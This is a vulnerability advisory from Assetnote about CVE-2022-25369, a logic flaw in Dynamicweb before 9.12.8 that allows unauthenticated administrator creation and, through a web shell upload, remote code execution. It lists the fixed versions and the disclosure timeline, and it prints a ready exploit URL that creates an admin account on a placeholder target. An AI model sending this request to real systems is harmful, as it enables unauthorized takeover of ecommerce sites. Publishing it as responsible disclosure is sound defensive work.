---
source: assetnote
source_url: https://blog.assetnote.io/2022/02/20/dynamicweb-advisory/
title: "Advisory: Dynamicweb Logic Flaw Leading to RCE (CVE-2022-25369) – Assetnote"
author: "Assetnote Team"
description: "Application security issues found by Assetnote"
---

[← Back to Blog](https://blog.assetnote.io/)

# Advisory: Dynamicweb Logic Flaw Leading to RCE (CVE-2022-25369)

Feb 20, 2022

## Summary

An issue was discovered in Dynamicweb before 9.12.8. An attacker can add a new administrator user without authentication. This flaw exists due to a logic issue when determining if the setup phases of the product can be run again.

## Impact

Once an attacker is authenticated as the new admin user they have added, it is possible to upload a web shell and achieve command execution.

## Version Tested Against

DynamicWeb 9.12.6

## Product Description

Dynamicweb offers a cloud based eCommerce suite. Dynamicweb enables customers to deliver better digital customer experiences and to scale ecommerce success through our Content Management, Digital Marketing, Ecommerce, and Product Information Management solutions.

## Solution

Hotfixed versions that contain a fix can be found below:

- Dynamicweb 9.5.9
- Dynamicweb 9.6.16
- Dynamicweb 9.7.8
- Dynamicweb 9.8.11
- Dynamicweb 9.9.
- Dynamicweb 9.10.18
- Dynamicweb 9.12.8
- Dynamicweb 9.13.0+

## Vulnerabilities

```bash
https://target.com/Admin/Access/Setup/Default.aspx?Action=createadministrator&adminusername=admin1&adminpassword=admin1&adminemail=test@test.com&adminname=test
```

## Blog Post

The blog post detailing the steps taken for the discovery of this vulnerability can be found [here](https://blog.assetnote.io/2022/02/20/logicflaw-dynamicweb-rce/).

## Credits

Assetnote Security Research Team

## Timeline

The timeline for this disclosure process can be found below:

- **Jan 21st, 2022**: Disclosure of pre-auth bug to add admin user
- **Jan 21st, 2022**: Confirmation and fix information from Dynamicweb CTO
- **Jan 24th, 2022**: Fixes rolled out to Dynamicweb customers
- **Feb 24th, 2022**: Published advisory and blog post

##### Share this post:

[Share on Twitter](https://twitter.com/intent/tweet?text=Advisory%3A+Dynamicweb+Logic+Flaw+Leading+to+RCE+%28CVE-2022-25369%29%20-%20@assetnote%20-%20&url=https%3A%2F%2Fblog.assetnote.io%2F2022%2F02%2F20%2Fdynamicweb-advisory%2F "Share on Twitter") [Share on LinkedIn](http://www.linkedin.com/shareArticle?url=https%3A%2F%2Fblog.assetnote.io%2F2022%2F02%2F20%2Fdynamicweb-advisory%2F&title=Advisory%3A+Dynamicweb+Logic+Flaw+Leading+to+RCE+%28CVE-2022-25369%29 "Share on LinkedIn") [Share on Reddit](http://reddit.com/submit?url=https%3A%2F%2Fblog.assetnote.io%2F2022%2F02%2F20%2Fdynamicweb-advisory%2F&title=Advisory%3A+Dynamicweb+Logic+Flaw+Leading+to+RCE+%28CVE-2022-25369%29 "Share on Reddit") [Share on Hacker News](https://news.ycombinator.com/submitlink?u=https%3A%2F%2Fblog.assetnote.io%2F2022%2F02%2F20%2Fdynamicweb-advisory%2F&t=Advisory%3A+Dynamicweb+Logic+Flaw+Leading+to+RCE+%28CVE-2022-25369%29 "Share on Hacker News")

### See Assetnote in action

Find out how Assetnote can help you lock down your external attack surface.

Use the lead form below, or alternatively contact us via email by clicking [here.](mailto:sales@assetnote.io?subject=Hi%20-%20I%27m%20interested%20in%20Assetnote&body=Phone%20Number:%20%0AJob%20Title:%20%0ACompany:%20%0ANext%20Steps:%20ie.%20Demo,%20Further%20Documentation%0ABuying%20Cycle:%20Q1/Q2/Q3/Q4)

REQUEST A DEMO

### Thank you!

We will be in touch.

Twitter Widget Iframe